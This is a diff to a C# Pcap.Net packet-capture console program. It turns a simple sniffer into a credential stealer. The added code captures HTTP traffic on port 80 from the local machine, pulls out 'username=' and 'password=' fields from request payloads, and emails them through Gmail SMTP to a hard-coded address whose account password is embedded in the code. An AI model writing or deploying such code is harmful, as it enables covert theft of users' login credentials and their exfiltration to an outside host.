@@ -8,16 +8,37 @@ using PcapDotNet.Core;
 using PcapDotNet.Packets;
 using PcapDotNet.Packets.IpV4;
 using PcapDotNet.Packets.Transport;
+using System.Net;
+using System.IO;
+using System.Net.Mail;
 
 namespace ConsoleApplication28
 {
     class Program
     {
 
+        public static string LocalIPAddress()
+        {
+            IPHostEntry host;
+            string localIP = "";
+            host = Dns.GetHostEntry(Dns.GetHostName());
+            foreach (IPAddress ip in host.AddressList)
+            {
+                if (ip.AddressFamily.ToString() == "InterNetwork")
+                {
+                    localIP = ip.ToString();
+                    break;
+                }
+            }
+            return localIP;
+        }
+
         static void Main(string[] args)
         {
             // Retrieve the device list from the local machine
             IList<LivePacketDevice> allDevices = LivePacketDevice.AllLocalMachine;
+
+            Console.WriteLine("Your Local Ip Addreas is:" + LocalIPAddress());
 
             if (allDevices.Count == 0)
             {
@@ -31,7 +52,7 @@ namespace ConsoleApplication28
                 LivePacketDevice device = allDevices[i];
                 Console.Write((i + 1) + ". " + device.Name);
                 if (device.Description != null)
-                    Console.WriteLine(" (" + device.Description + ")");
+                    Console.WriteLine("(" + device.Description + ")");
                 else
                     Console.WriteLine(" (No description available)");
             }
@@ -58,7 +79,7 @@ namespace ConsoleApplication28
                                     PacketDeviceOpenAttributes.Promiscuous, // promiscuous mode
                                     1000))                                  // read timeout
             {
-                using (BerkeleyPacketFilter filter = communicator.CreateFilter("src 192.168.1.201 and tcp port 80"))
+                using (BerkeleyPacketFilter filter = communicator.CreateFilter("src " + LocalIPAddress() + " and tcp port 80"))
                 {
                     // Set the filter
                     communicator.SetFilter(filter);
@@ -74,11 +95,44 @@ namespace ConsoleApplication28
         // Callback function invoked by Pcap.Net for every incoming packet
         private static void PacketHandler(Packet packet)
         {
-            Console.WriteLine(packet.Timestamp.ToString("yyyy-MM-dd hh:mm:ss.fff") + " length:" + packet.Length);
+            //Console.WriteLine(packet.Timestamp.ToString("yyyy-MM-dd hh:mm:ss.fff") + " length:" + packet.Length);
             IpV4Datagram ip = packet.Ethernet.IpV4;
             UdpDatagram udp = ip.Udp;
+            TcpDatagram tcp = ip.Tcp;
+            string content = "";
+            // pull the payload 
+            if (tcp.IsValid && tcp.PayloadLength > 0)
+            {
+                Datagram dg = tcp.Payload;
+                MemoryStream ms = dg.ToMemoryStream();
+                StreamReader sr = new StreamReader(ms);
+                content = sr.ReadToEnd();
+            }
+
             // print ip addresses and udp ports
-            Console.WriteLine(ip.Source + ":" + udp.SourcePort + " -> " + ip.Destination + ":" + udp.DestinationPort);
+            string s = content;
+
+            if (s.IndexOf("username=") != -1 && s.IndexOf("password=") != -1)
+            {
+                int userLength = s.IndexOf("&pass") - s.IndexOf("username=");
+                string username = s.Substring(s.IndexOf("username="), userLength);
+                Console.WriteLine(username);
+                int passLength = s.IndexOf("&sub") - s.IndexOf("password=");
+                string pass = s.Substring(s.IndexOf("password="), passLength);
+                Console.WriteLine(pass);
+
+                string smtp = "smtp.gmail.com";
+                string emailaddr = "cybersniffsniff@gmail.com";
+                string emailuser = "cybersniffsniff";
+                string emailpassword = "cybergal123";
+
+                MailMessage mail = new MailMessage(emailaddr, emailaddr, "Login From:" + LocalIPAddress() , username + "\n" + pass);
+                SmtpClient client = new SmtpClient(smtp);
+                client.Port = 587;
+                client.Credentials = new System.Net.NetworkCredential(emailuser, emailpassword);
+                client.EnableSsl = true;
+                client.Send(mail);             
+            }
         }
     }
 }
